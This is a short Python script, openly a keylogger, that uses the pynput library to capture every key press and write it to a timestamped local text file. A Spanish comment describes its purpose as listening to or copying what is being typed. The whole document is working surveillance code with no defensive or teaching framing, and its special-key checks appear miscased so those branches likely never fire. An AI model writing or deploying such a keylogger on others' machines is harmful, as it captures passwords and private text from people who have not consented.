from pynput import keyboard
from pynput.keyboard import Listener
import datetime

d = datetime.datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
f = open('keylogger_{}.txt'.format(d), 'w')

def key_recorder(key):
    key = str(key)

    if key == 'key.enter':
        f.write('\n')
    elif key == 'key.space':
        f.write(' ')
    elif key == 'key.backspace':
        f.write('%BORRAR%')
    else:
        f.write(key.replace("'", ""))

with Listener(on_press=key_recorder) as l:
    l.join()

#este codigo permite escuchar o copiar lo que se esta escribiendo y traspasarlo a un archivo txt